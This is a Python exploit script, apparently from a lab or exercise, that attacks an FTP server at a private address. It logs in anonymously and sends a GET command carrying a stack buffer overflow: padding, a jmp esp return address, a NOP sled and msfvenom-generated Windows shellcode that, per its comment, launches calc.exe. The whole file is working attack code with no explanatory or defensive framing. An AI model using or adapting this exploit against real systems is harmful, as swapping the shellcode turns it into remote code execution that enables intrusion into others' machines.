#!/usr/bin/env python3

from pwn import *


padding = b'\x41' * 2007
nops =    b'\x90' * 64

# msfvenom -p windows/exec -b '\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d' -f py CMD=calc.exe
shellcode =  b""
shellcode += b"\x31\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shellcode += b"\x76\x0e\xaa\xea\x8e\xd0\x83\xee\xfc\xe2\xf4\x56\x02"
shellcode += b"\x0c\xd0\xaa\xea\xee\x59\x4f\xdb\x4e\xb4\x21\xba\xbe"
shellcode += b"\x5b\xf8\xe6\x05\x82\xbe\x61\xfc\xf8\xa5\x5d\xc4\xf6"
shellcode += b"\x9b\x15\x22\xec\xcb\x96\x8c\xfc\x8a\x2b\x41\xdd\xab"
shellcode += b"\x2d\x6c\x22\xf8\xbd\x05\x82\xba\x61\xc4\xec\x21\xa6"
shellcode += b"\x9f\xa8\x49\xa2\x8f\x01\xfb\x61\xd7\xf0\xab\x39\x05"
shellcode += b"\x99\xb2\x09\xb4\x99\x21\xde\x05\xd1\x7c\xdb\x71\x7c"
shellcode += b"\x6b\x25\x83\xd1\x6d\xd2\x6e\xa5\x5c\xe9\xf3\x28\x91"
shellcode += b"\x97\xaa\xa5\x4e\xb2\x05\x88\x8e\xeb\x5d\xb6\x21\xe6"
shellcode += b"\xc5\x5b\xf2\xf6\x8f\x03\x21\xee\x05\xd1\x7a\x63\xca"
shellcode += b"\xf4\x8e\xb1\xd5\xb1\xf3\xb0\xdf\x2f\x4a\xb5\xd1\x8a"
shellcode += b"\x21\xf8\x65\x5d\xf7\x80\x8f\x5d\x2f\x58\x8e\xd0\xaa"
shellcode += b"\xba\xe6\xe1\x21\x85\x09\x2f\x7f\x51\x7e\x65\x08\xbc"
shellcode += b"\xe6\x76\x3f\x57\x13\x2f\x7f\xd6\x88\xac\xa0\x6a\x75"
shellcode += b"\x30\xdf\xef\x35\x97\xb9\x98\xe1\xba\xaa\xb9\x71\x05"
shellcode += b"\xc9\x8b\xe2\xb3\x84\x8f\xf6\xb5\xaa\xea\x8e\xd0"

payload = flat(
    padding,
    p32(0x75866c28), # jmp esp;
    nops, shellcode
)

with remote('192.168.122.187', 21) as r:
    r.clean()
    r.writeline('USER anonymous')

    r.clean()
    r.writeline('PASS anonymous')

    r.clean()
    r.writeline(b'GET %s' % payload)

